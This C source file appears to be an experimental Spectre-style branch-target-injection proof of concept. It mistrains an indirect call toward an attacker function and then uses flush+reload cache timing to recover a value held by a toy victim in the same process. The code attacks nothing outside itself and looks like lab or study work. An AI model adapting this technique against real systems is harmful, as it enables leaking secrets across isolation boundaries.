/*
	Poison branch predictor with arbitrary targets
*/

#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h> // _mm_clflush__()
#include <x86intrin.h> // __rdtscp()

#include "utils.h"

#define ARRAY_SIZE 256 // number of possible byte values
#define DELTA 1024
#define NUM_ITER 200
#define CACHE_HIT_THRESHOLD 100
#define CACHE_HIT_PREFETCH_THRESHOLD 150

#define NUM_RUNS 1000000

uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE + DELTA];
uint8_t temp = 0;
int size = 10;

void flush() {
	for(int i=0; i<ARRAY_SIZE; i++) {
		_mm_clflush(&probe_array[i * PAGE_SIZE + DELTA]); // removes from all cache hierarchies
	}
}

void victim_func(int num) {
	//printf("Hallo!\n");
}

void attacker_func(int idx) {
	probe_array[idx * PAGE_SIZE + DELTA] = 5;
}

int main(int argc, char* argv[]) {

    for(int run=0; run<NUM_RUNS; run++) {	
	    register uint64_t start, total_cycles; // cycle timestamps
	    uint8_t* addr; // pointer to a byte	
	    unsigned int junk = 0;
	    int guess = 0;

	    user_t attacker;
	    attacker.func = attacker_func;
	    attacker.val = 5;

	    user_t victim;
	    victim.func = victim_func;
	    victim.val = 54; // want to obtain this value from side-channel

	    // initialize probe_array ; need this step to see timing differences for some reason... porque?
	    for(int i=0; i<ARRAY_SIZE; i++) {
	    	probe_array[i * PAGE_SIZE + DELTA] = 1;
	    }

	    // poison the branch for the first NUM_ITER-1 iterations, then on the final iteration, call victim
	    user_t* user = &attacker;
	    for(int iter=0; iter<NUM_ITER; iter++) {
	    	_mm_clflush(user->func); // increase speculation window
	    	//for(int n=0; n<50; n++) {
	    	//	if(user->val > 0) { // According to Google Project Zero, this would help??
	    	//	}
	    	//}
	    	user->func(user->val); // want to poison this branch...
	    	if(iter+1 == NUM_ITER - 1) {
	    		flush(); // remove probe_array from cache
	    		user = &victim;
	    	}
	    }

	    // measure the clflush() instruction for each element
	    for(int i=0; i<ARRAY_SIZE; i++) {
	    	addr = &probe_array[i * PAGE_SIZE + DELTA];
	    	start = __rdtscp(&junk);
	    	junk = *addr; // access byte
	    	total_cycles = __rdtscp(&junk) - start;
	    	//if(total_cycles < CACHE_HIT_PREFETCH_THRESHOLD) guess = i;
	    	if(total_cycles < CACHE_HIT_THRESHOLD) guess = i;
	    	//printf("[%3i]: %d cycles\n", i, (int)total_cycles);
	    }
    }
	
	//printf("Guess: %i, actual: %i\n", guess, victim.val);
	
	return 0;
}
